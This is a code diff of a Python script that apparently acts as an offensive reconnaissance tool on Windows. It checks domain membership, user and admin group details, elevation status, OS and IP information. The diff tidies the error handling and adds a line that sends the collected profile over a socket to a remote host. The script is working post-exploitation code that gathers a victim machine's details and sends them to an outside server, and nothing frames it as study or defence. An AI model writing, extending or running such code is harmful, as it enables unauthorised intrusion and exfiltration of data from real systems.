@@ -99,18 +99,17 @@ except:
     ipaddrinfo="No IP addresses found"
 
 try:
-    # Runs a powershell command. It is to determine if the machine is on a domain.
-    domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
-    # Returns useful readable information 
-    domaininfo = domaininfo.stdout.strip()
-    if "Unable" in domaininfo.stderr:
+    # Runs whoami to determine if the machine is on a domain.
+    result = subprocess.run("whoami /FQDN", capture_output=True, text=True)
+    domaininfo = result.stdout.strip()
+    if "Unable" in result.stderr:
         Domain = False
         print("[-] NOT within a domain!")
     else:
         print("[+] Within a domain!")
         Domain = True
-except:
-    print("[!] unexpected error...")
+except Exception as e:
+    print(f"[!] unexpected error: {e}")
 
 # Extracts the username of current user
 gathering=subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)
@@ -126,7 +125,9 @@ else:
     info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((host, port)) # Connects using port and IP address
+client.connect((host, port))
+
+client.sendall(info.encode("utf-8"))
 
 # INFO SENT TO SERVER:
 # if Domain == True:    
